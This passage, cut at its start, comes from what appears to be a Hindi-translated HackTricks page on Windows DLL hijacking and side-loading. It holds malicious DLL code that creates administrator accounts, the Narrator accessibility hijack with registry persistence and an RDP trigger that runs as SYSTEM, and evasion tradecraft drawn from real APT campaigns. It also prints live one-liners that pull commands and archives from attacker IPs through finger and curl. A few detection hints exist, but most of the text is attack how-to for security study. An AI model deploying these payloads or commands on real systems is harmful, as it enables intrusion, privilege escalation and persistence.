        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>User creation के साथ C++ DLL का उदाहरण</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>थ्रेड एंट्री वाला वैकल्पिक C DLL</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## केस स्टडी: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe स्टार्ट होने पर अब भी एक अनुमानित, भाषा-विशिष्ट localization DLL को खोजता है, जिसे arbitrary code execution और persistence के लिए hijack किया जा सकता है।<sup>[[7]](#references)</sup>

मुख्य तथ्य
- Probe path (वर्तमान builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (पुराने builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- यदि OneCore path पर attacker के नियंत्रण वाली writable DLL मौजूद हो, तो उसे load किया जाता है और `DllMain(DLL_PROCESS_ATTACH)` execute होता है। किसी export की आवश्यकता नहीं है।

Procmon से खोज
- Filter: `Process Name is Narrator.exe` और `Operation is Load Image` या `CreateFile`.
- Narrator शुरू करें और ऊपर दिए गए path को load करने के प्रयास को देखें।

न्यूनतम DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC में शांत रहना
- एक भोला hijack UI में आवाज़/हाइलाइट दिखाएगा। शांत रहने के लिए, attach होने पर Narrator threads enumerate करें, main thread खोलें (`OpenThread(THREAD_SUSPEND_RESUME)`) और उसे `SuspendThread` करें; अपने thread में काम जारी रखें। पूरे code के लिए PoC देखें।<sup>[[8]](#references)</sup>

Accessibility configuration के ज़रिए trigger और persistence
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- ऊपर दिए गए तरीकों से, Narrator शुरू करने पर planted DLL load होती है। Secure desktop (logon screen) पर Narrator शुरू करने के लिए CTRL+WIN+ENTER दबाएँ; आपकी DLL secure desktop पर SYSTEM के रूप में execute होगी।

RDP-triggered SYSTEM execution (lateral movement)
- Classic RDP security layer की अनुमति दें: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Host पर RDP करें, फिर logon screen पर Narrator शुरू करने के लिए CTRL+WIN+ENTER दबाएँ; आपकी DLL secure desktop पर SYSTEM के रूप में execute होगी।
- RDP session बंद होने पर execution रुक जाती है—जल्दी inject/migrate करें।

Bring Your Own Accessibility (BYOA)
- आप किसी built-in Accessibility Tool (AT) की registry entry (जैसे, CursorIndicator) clone कर सकते हैं, उसमें किसी भी binary/DLL का path सेट करके उसे edit और import कर सकते हैं, फिर `configuration` को उस AT name पर सेट कर सकते हैं। इससे Accessibility framework के तहत arbitrary execution proxy होती है।

नोट्स
- `%windir%\System32` में लिखने और HKLM values बदलने के लिए admin rights आवश्यक हैं।
- Payload का पूरा logic `DLL_PROCESS_ATTACH` में रखा जा सकता है; exports की ज़रूरत नहीं है।

## Case Study: CVE-2025-1729 - TPQMAssistant.exe का उपयोग करके Privilege Escalation

यह case Lenovo के TrackPoint Quick Menu (`TPQMAssistant.exe`) में **Phantom DLL Hijacking** दिखाता है, जिसे **CVE-2025-1729** के रूप में track किया गया है।<sup>[[2]](#references)[[3]](#references)</sup>

### Vulnerability की जानकारी

- **Component**: `C:\ProgramData\Lenovo\TPQM\Assistant\` में स्थित `TPQMAssistant.exe`।
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` हर दिन सुबह 9:30 बजे logged-on user के context में चलता है।
- **Directory Permissions**: `CREATOR OWNER` को write करने की अनुमति है, जिससे local users arbitrary files डाल सकते हैं।
- **DLL Search Behavior**: पहले अपनी working directory से `hostfxr.dll` load करने की कोशिश करता है और उसके न मिलने पर "NAME NOT FOUND" log करता है, जो local directory search की प्राथमिकता दर्शाता है।

### Exploit को लागू करना

Attacker उसी directory में malicious `hostfxr.dll` stub रख सकता है और missing DLL का फ़ायदा उठाकर user के context में code execution हासिल कर सकता है:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Attack Flow

1. एक standard user के रूप में, `C:\ProgramData\Lenovo\TPQM\Assistant\` में `hostfxr.dll` रखें।
2. वर्तमान user के context में scheduled task के सुबह 9:30 बजे चलने तक प्रतीक्षा करें।
3. यदि task चलने के समय कोई administrator logged in है, तो malicious DLL administrator के session में medium integrity पर चलती है।
4. medium integrity से SYSTEM privileges तक elevate करने के लिए standard UAC bypass techniques को chain करें।

## Case Study: MSI CustomAction Dropper + Signed Host (wsc_proxy.exe) के ज़रिए DLL Side-Loading

Threat actors अक्सर trusted, signed process के तहत payloads चलाने के लिए MSI-based droppers को DLL side-loading के साथ जोड़ते हैं।<sup>[[10]](#references)</sup>

चेन का अवलोकन
- User MSI डाउनलोड करता है। GUI install के दौरान CustomAction चुपचाप चलता है (जैसे, LaunchApplication या VBScript action) और embedded resources से अगला stage फिर से बनाता है।
- Dropper एक legitimate, signed EXE और एक malicious DLL को एक ही directory में लिखता है (उदाहरण जोड़ी: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll)।
- Signed EXE शुरू होने पर, Windows DLL search order working directory से पहले wsc.dll लोड करता है, जिससे signed parent के तहत attacker code चलता है (ATT&CK T1574.001)।

MSI analysis (क्या देखें)
- CustomAction table:
  - ऐसी entries देखें जो executables या VBScript चलाती हैं। उदाहरण suspicious pattern: LaunchApplication, जो background में embedded file चलाता है।
  - Orca (Microsoft Orca.exe) में CustomAction, InstallExecuteSequence और Binary tables की जाँच करें।
- MSI CAB में embedded/split payloads:
  - Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
  - या lessmsi इस्तेमाल करें: lessmsi x package.msi C:\out
  - कई छोटे fragments देखें, जिन्हें VBScript CustomAction जोड़ता और decrypt करता है। सामान्य flow:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

wsc_proxy.exe के साथ व्यावहारिक sideloading
- ये दो फ़ाइलें एक ही फ़ोल्डर में रखें:
  - wsc_proxy.exe: वैध रूप से signed host (Avast)। यह process अपने directory से नाम के आधार पर wsc.dll लोड करने का प्रयास करता है।
  - wsc.dll: attacker DLL। यदि किसी विशेष exports की आवश्यकता न हो, तो DllMain पर्याप्त है; अन्यथा, एक proxy DLL बनाएँ और DllMain में payload चलाते हुए आवश्यक exports को genuine library तक forward करें।
- एक minimal DLL payload बनाएँ:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Export requirements के लिए, ऐसा proxying framework (जैसे DLLirant/Spartacus) इस्तेमाल करें जो एक forwarding DLL जनरेट करे और आपका payload भी execute करे।

- यह technique host binary द्वारा DLL name resolution पर निर्भर करती है। यदि host absolute paths या safe loading flags (जैसे LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories) का इस्तेमाल करता है, तो hijack विफल हो सकता है।
- KnownDLLs, SxS और forwarded exports precedence को प्रभावित कर सकते हैं; host binary और export set चुनते समय इन बातों पर विचार करना चाहिए।

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point ने बताया कि Ink Dragon, वैध सॉफ़्टवेयर में घुलने-मिलने और core payload को disk पर encrypted रखने के लिए **three-file triad** का इस्तेमाल करके ShadowPad deploy करता है:<sup>[[12]](#references)</sup>

1. **Signed host EXE** – AMD, Realtek या NVIDIA जैसे vendors का दुरुपयोग किया जाता है (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`)। हमलावर executable का नाम बदलकर उसे Windows binary जैसा दिखाते हैं (उदाहरण के लिए `conhost.exe`), लेकिन Authenticode signature वैध रहता है।
2. **Malicious loader DLL** – अपेक्षित नाम (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`) के साथ EXE के बगल में रखा जाता है। DLL आमतौर पर ScatterBrain framework से obfuscated MFC binary होती है; इसका एकमात्र काम encrypted blob ढूँढ़ना, उसे decrypt करना और ShadowPad को reflectively map करना है।
3. **Encrypted payload blob** – अक्सर उसी directory में `<name>.tmp` के रूप में रखा जाता है। Decrypted payload को memory-map करने के बाद, loader forensic evidence नष्ट करने के लिए TMP file को delete कर देता है।

Tradecraft notes:

* PE header में मूल `OriginalFileName` रखते हुए signed EXE का नाम बदलने से वह vendor signature बनाए रखते हुए Windows binary का रूप ले सकता है। इसलिए Ink Dragon की उस आदत को अपनाएँ जिसमें `conhost.exe` जैसे दिखने वाले binaries गिराए जाते हैं, जबकि वे वास्तव में AMD/NVIDIA utilities होते हैं।
* चूँकि executable trusted बना रहता है, अधिकतर allowlisting controls के लिए बस इतना ज़रूरी है कि आपकी malicious DLL उसके साथ रखी हो। Loader DLL को customize करने पर ध्यान दें; आम तौर पर signed parent को बिना बदलाव चलाया जा सकता है।
* ShadowPad का decryptor अपेक्षा करता है कि TMP blob loader के बगल में हो और writable हो, ताकि mapping के बाद वह file को zero कर सके। Payload load होने तक directory writable रखें; memory में आने के बाद OPSEC के लिए TMP file को सुरक्षित रूप से delete किया जा सकता है।

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators, DLL sideloading को LOLBAS के साथ जोड़ते हैं, ताकि disk पर एकमात्र custom artifact trusted EXE के बगल में मौजूद malicious DLL हो:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Hidden PowerShell, `cmd.exe /c` को spawn करता है, Finger server से commands प्राप्त करता है और उन्हें `cmd` में pipe करता है:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` TCP/79 से text खींचता है; `| cmd` server response को execute करता है, जिससे operators server-side पर second stage server को rotate कर सकते हैं।

- **Built-in download/extract:** किसी benign extension वाली archive download करें, उसे unpack करें और sideload target तथा DLL को किसी random `%LocalAppData%` folder में stage करें:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` progress छिपाता है और redirects को follow करता है; `tar -xf` Windows के built-in tar का उपयोग करता है।

- **WMI/CIM launch:** EXE को WMI के ज़रिए start करें, ताकि telemetry में colocated DLL load करते समय CIM-created process दिखे:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - उन binaries के साथ काम करता है जो local DLLs को प्राथमिकता देते हैं (जैसे, `intelbq.exe`, `nearby_share.exe`); payload (जैसे, Remcos) trusted name के तहत चलता है।

- **Hunting:** जब `/p`, `/m`, और `/c` एक साथ दिखाई दें, तो `forfiles` पर alert करें; admin scripts के बाहर इसका उपयोग असामान्य है।


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

हाल ही में हुए Lotus Blossom intrusion में एक trusted update chain का दुरुपयोग करके NSIS-packed dropper पहुँचाया गया, जिसने DLL sideload और पूरी तरह memory में चलने वाले payloads को stage किया।<sup>[[13]](#references)</sup>

Tradecraft flow
- `update.exe` (NSIS) `%AppData%\Bluetooth` बनाता है, उसे **HIDDEN** के रूप में चिह्नित करता है, Bitdefender Submission Wizard के बदले हुए नाम वाले `BluetoothService.exe`, एक malicious `log.dll`, और एक encrypted blob `BluetoothService` डालता है, फिर EXE launch करता है।
- Host EXE `log.dll` import करता है और `LogInit`/`LogWrite` को call करता है। `LogInit` blob को mmap-load करता है; `LogWrite` उसे custom LCG-based stream से decrypt करता है (constants **0x19660D** / **0x3C6EF35F**, key material एक पुराने hash से निकाला गया), buffer को plaintext shellcode से overwrite करता है, temps को free करता है, और उसमें jump करता है।
- IAT से बचने के लिए, loader export names को hash करके APIs resolve करता है। इसमें **FNV-1a basis 0x811C9DC5 + prime 0x1000193** का उपयोग होता है, फिर Murmur-style avalanche (**0x85EBCA6B**) लागू करके salted target hashes से तुलना की जाती है।

Main shellcode (Chrysalis)
- पाँच passes में key `gQ2JR&9;` के साथ add/XOR/sub दोहराकर PE-जैसे main module को decrypt करता है, फिर import resolution पूरा करने के लिए `Kernel32.dll` → `GetProcAddress` को dynamically load करता है।
- हर character पर bit-rotate/XOR transforms लागू करके runtime में DLL name strings दोबारा बनाता है, फिर `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32` load करता है।
- दूसरा resolver **PEB → InMemoryOrderModuleList** को traverse करता है, हर export table को Murmur-style mixing के साथ 4-byte blocks में parse करता है, और hash न मिलने पर ही `GetProcAddress` का सहारा लेता है।

Embedded configuration & C2
- Config, डाली गई `BluetoothService` file में **offset 0x30808** (size **0x980**) पर रहता है और key `qwhvb^435h&*7` से RC4-decrypt होता है, जिससे C2 URL और User-Agent सामने आते हैं।
- Beacons dot-delimited host profile बनाते हैं, tag `4Q` जोड़ते हैं, फिर HTTPS पर `HttpSendRequestA` से भेजने से पहले key `vAuig34%^325hGV` से RC4-encrypt करते हैं। Responses को RC4-decrypt करके tag switch के ज़रिए dispatch किया जाता है (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases)।
- Execution mode CLI args से नियंत्रित होता है: बिना args के persistence install होती है (service/Run key), जो `-i` की ओर point करती है; `-i` self को `-k` के साथ relaunch करता है; `-k` install छोड़कर payload चलाता है।

Alternate loader observed
- इसी intrusion में Tiny C Compiler भी डाला गया और `C:\ProgramData\USOShared\` से `svchost.exe -nostdlib -run conf.c` चलाया गया, जिसके साथ `libtcc.dll` भी मौजूद था। Attacker द्वारा दिए गए C source में shellcode embedded था; उसे compile करके memory में चलाया गया और PE को disk पर लिखने की ज़रूरत नहीं पड़ी। इसे इस तरह दोहराएँ:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- इस TCC-आधारित compile-and-run चरण ने runtime पर `Wininet.dll` import किया और hardcoded URL से दूसरे चरण का shellcode प्राप्त किया, जिससे एक लचीला loader बना जो compiler run जैसा दिखता है।

## Signed-host sideloading with export proxying + host thread parking

कुछ DLL sideloading chains में **stability engineering** भी शामिल होती है, ताकि वैध host बाद के stages को बिना क्रैश हुए ठीक से load करने के लिए पर्याप्त समय तक चलता रहे।<sup>[[11]](#references)</sup>

देखा गया पैटर्न
- अपेक्षित dependency नाम, जैसे `version.dll`, का उपयोग करके किसी trusted EXE को malicious DLL के साथ रखें।
- Malicious DLL, हर अपेक्षित export को असली system DLL (उदाहरण के लिए `%SystemRoot%\\System32\\version.dll`) पर **proxy** करता है, ताकि import resolution सफल रहे और host process काम करता रहे।
- Load होने के बाद, malicious DLL host entry point को **patch** करता है, ताकि main thread बाहर निकलने या process को समाप्त करने वाले code paths चलाने के बजाय अनंत `Sleep` loop में चला जाए।
- एक नया thread असली malicious काम करता है: अगले चरण के DLL नाम या path को decrypt करना (RC4/XOR आम हैं), फिर `LoadLibrary` से उसे launch करना।

यह क्यों महत्वपूर्ण है
- सामान्य DLL proxying API compatibility बनाए रखती है, लेकिन यह सुनिश्चित नहीं करती कि बाद के stages load होने तक host चलता रहेगा।
- Main thread को `Sleep(INFINITE)` में रोकना, signed process को चालू रखने का एक सरल तरीका है, जबकि loader worker thread में decryption, staging या network bootstrap करता है।
- केवल संदिग्ध `DllMain` की तलाश करने पर यह पैटर्न छूट सकता है, क्योंकि रोचक गतिविधि host entry point patch होने और secondary thread शुरू होने के बाद होती है।

न्यूनतम workflow
1. Signed host EXE की copy बनाएँ और पता लगाएँ कि वह local directory से कौन-सी DLL resolve करता है।
2. समान functions export करने वाली proxy DLL बनाएँ और उन्हें legitimate DLL पर forward करें।
3. `DllMain(DLL_PROCESS_ATTACH)` में worker thread बनाएँ।
4. उस thread से host entry point या main thread start routine को patch करें, ताकि वह `Sleep` loop में चले।
5. अगले चरण के DLL नाम/config को decrypt करें और `LoadLibrary` call करें या payload को manual-map करें।

रक्षा के लिए जाँच के संकेत
- ऐसे signed processes जो `version.dll` या इसी तरह की आम libraries को `System32` के बजाय अपनी application directory से load करते हैं।
- Image load होने के तुरंत बाद process entry point पर memory patches, खासकर ऐसे jumps/calls जो `Sleep`/`SleepEx` पर redirect हों।
- Proxy DLL द्वारा बनाए गए ऐसे threads जो तुरंत decrypted नाम वाली दूसरी DLL पर `LoadLibrary` call करते हैं।
- Writable staging directories, जैसे `ProgramData`, `%TEMP%` या unpacked archive paths में vendor executables के पास रखी गई full-export proxy DLLs।

## References

- [1] [Red Canary – Intelligence Insights: जनवरी 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - TPQMAssistant.exe का उपयोग करके Privilege Escalation](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – Windows में DLL hijacking। सरल C उदाहरण।](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore ने Europe को निशाना बनाने वाला नया Malware तैनात किया](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: जब DLL Hijacks का सामना Windows Helpers से होता है](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digital Doppelgangers: Gh0st RAT वितरित करने वाले बदलते Impersonation Campaigns का विश्लेषण](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – मिलते-जुलते हित: दक्षिण-पूर्व एशियाई सरकार को निशाना बनाने वाले Threat Clusters का विश्लेषण](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Ink Dragon के भीतर: Stealthy Offensive Operation के Relay Network और आंतरिक कार्यप्रणाली का खुलासा](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Chrysalis Backdoor: Lotus Blossom के toolkit का गहन विश्लेषण](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Iranian APT Screening Serpens के 2026 Espionage Campaigns पर नज़र](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – तेज़ और उग्र: Iranian Conflict के दौरान Nimbus Manticore Operations](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 ने दक्षिण-पूर्व एशियाई सरकारों और Critical Infrastructure को निशाना बनाया](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
